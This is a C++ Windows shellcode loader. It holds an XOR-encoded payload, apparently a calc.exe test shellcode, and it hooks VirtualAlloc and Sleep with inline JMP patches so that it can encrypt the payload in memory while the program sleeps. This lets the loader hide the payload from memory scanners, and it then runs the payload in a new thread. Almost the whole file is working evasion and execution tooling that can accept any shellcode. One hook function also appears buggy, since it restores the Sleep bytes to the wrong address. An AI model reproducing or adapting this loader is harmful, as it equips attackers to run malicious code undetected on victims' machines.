// ConsoleApplication14.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

unsigned char shellcode[193] = {
	0x95, 0x81, 0xEB, 0x69, 0x69, 0x69, 0x09, 0xE0,
	0x8C, 0x58, 0xA9, 0x0D, 0xE2, 0x39, 0x59, 0xE2,
	0x3B, 0x65, 0xE2, 0x3B, 0x7D, 0xE2, 0x1B, 0x41,
	0x66, 0xDE, 0x23, 0x4F, 0x58, 0x96, 0xC5, 0x55,
	0x08, 0x15, 0x6B, 0x45, 0x49, 0xA8, 0xA6, 0x64,
	0x68, 0xAE, 0x8B, 0x9B, 0x3B, 0x3E, 0xE2, 0x3B,
	0x79, 0xE2, 0x23, 0x55, 0xE2, 0x25, 0x78, 0x11,
	0x8A, 0x21, 0x68, 0xB8, 0x38, 0xE2, 0x30, 0x49,
	0x68, 0xBA, 0xE2, 0x20, 0x71, 0x8A, 0x53, 0x20,
	0xE2, 0x5D, 0xE2, 0x68, 0xBF, 0x58, 0x96, 0xC5,
	0xA8, 0xA6, 0x64, 0x68, 0xAE, 0x51, 0x89, 0x1C,
	0x9F, 0x6A, 0x14, 0x91, 0x52, 0x14, 0x4D, 0x1C,
	0x8D, 0x31, 0xE2, 0x31, 0x4D, 0x68, 0xBA, 0x0F,
	0xE2, 0x65, 0x22, 0xE2, 0x31, 0x75, 0x68, 0xBA,
	0xE2, 0x6D, 0xE2, 0x68, 0xB9, 0xE0, 0x2D, 0x4D,
	0x4D, 0x32, 0x32, 0x08, 0x30, 0x33, 0x38, 0x96,
	0x89, 0x36, 0x36, 0x33, 0xE2, 0x7B, 0x82, 0xE4,
	0x34, 0x03, 0x68, 0xE4, 0xEC, 0xDB, 0x69, 0x69,
	0x69, 0x39, 0x01, 0x58, 0xE2, 0x06, 0xEE, 0x96,
	0xBC, 0xD2, 0x99, 0xDC, 0xCB, 0x3F, 0x01, 0xCF,
	0xFC, 0xD4, 0xF4, 0x96, 0xBC, 0x55, 0x6F, 0x15,
	0x63, 0xE9, 0x92, 0x89, 0x1C, 0x6C, 0xD2, 0x2E,
	0x7A, 0x1B, 0x06, 0x03, 0x69, 0x3A, 0x96, 0xBC,
	0x0A, 0x08, 0x05, 0x0A, 0x47, 0x0C, 0x11, 0x0C,
	0x69
};

PROC OldVirtualAllocAddress;
BYTE OldVirtualAllocBytes[5];
BYTE NewVirtualAllocBytes[5];
PROC OldSleepAddress;
BYTE OldSleepBytes[5];
BYTE NewSleepBytes[5];
LPVOID lpOldBuffer;
DWORD dwOldSize;
char *szRunTime;
DWORD dwShellcodeLength = 193;

void xorcode(char* szBuffer, int nLength, char key)
{
	for (size_t i = 0; i < nLength; i++)
	{
		szBuffer[i] ^= key;
	}
}

VOID VirtualAllocReHookFunc()
{
	SIZE_T sWriteLength = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldVirtualAllocAddress, NewVirtualAllocBytes, 5, &sWriteLength);
}

LPVOID WINAPI VirtualAllocHookCallBack(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	SIZE_T sWriteLength = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldVirtualAllocAddress, OldVirtualAllocBytes, 5, &sWriteLength);
	LPVOID lpBuffer = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	lpOldBuffer = lpBuffer;
	dwOldSize = dwSize;
	VirtualAllocReHookFunc();
	return lpBuffer;
}


//VirtualAlloc挂钩
void VirtualAllocHookFunc()
{
	OldVirtualAllocAddress = GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");
	SIZE_T sReadLength = 0;
	ReadProcessMemory(GetCurrentProcess(), OldVirtualAllocAddress, OldVirtualAllocBytes, 5, &sReadLength);
	NewVirtualAllocBytes[0] = '\xE9';
	*(DWORD*)(NewVirtualAllocBytes + 1) = (DWORD)VirtualAllocHookCallBack - (DWORD)OldVirtualAllocAddress - 5;
	SIZE_T sWriteLength = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldVirtualAllocAddress, NewVirtualAllocBytes, 5, &sWriteLength);
}


VOID WINAPI SleepHookCallBack(DWORD dwMilliseconds)
{
	DWORD dwOldProtect;
	VirtualProtect(lpOldBuffer, dwOldSize, PAGE_READWRITE, &dwOldProtect);
	xorcode((char*)lpOldBuffer, dwShellcodeLength, 0x69);
	VirtualProtect(lpOldBuffer, dwOldSize, PAGE_NOACCESS, &dwOldProtect);

	SIZE_T sWriteLength = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldSleepAddress, OldSleepBytes, 5, &sWriteLength);

	Sleep(dwMilliseconds);

	VirtualProtect(lpOldBuffer, dwOldSize, PAGE_READWRITE, &dwOldProtect);
	xorcode((char*)lpOldBuffer, dwShellcodeLength, 0x69);
	VirtualProtect(lpOldBuffer, dwOldSize, PAGE_EXECUTE, &dwOldProtect);

	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldVirtualAllocAddress, OldSleepBytes, 5, &sWriteLength);

}

void SleepHookFunc()
{
	OldSleepAddress = GetProcAddress(LoadLibraryA("kernel32.dll"), "Sleep");
	SIZE_T sReadLength = 0;
	ReadProcessMemory(GetCurrentProcess(), OldSleepAddress, OldSleepBytes, 5, &sReadLength);
	NewSleepBytes[0] = '\xE9';
	*(DWORD*)(NewSleepBytes + 1) = (DWORD)SleepHookCallBack - (DWORD)OldSleepAddress - 5;
	SIZE_T sWriteLength = 0;
	WriteProcessMemory(GetCurrentProcess(), (LPVOID)OldSleepAddress, NewSleepBytes, 5, &sWriteLength);
}


int main()
{
	SleepHookFunc();
	VirtualAllocHookFunc();
	szRunTime = (char*)VirtualAlloc(NULL, dwShellcodeLength, MEM_COMMIT, PAGE_READWRITE);
	DWORD dwOldProtect;
	VirtualProtect(szRunTime, dwShellcodeLength, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	RtlMoveMemory(szRunTime, shellcode, dwShellcodeLength);
	xorcode((char*)szRunTime, dwShellcodeLength, 0x69);
	Sleep(1000);
	HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, NULL, (LPTHREAD_START_ROUTINE)szRunTime, NULL, NULL, NULL);
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}
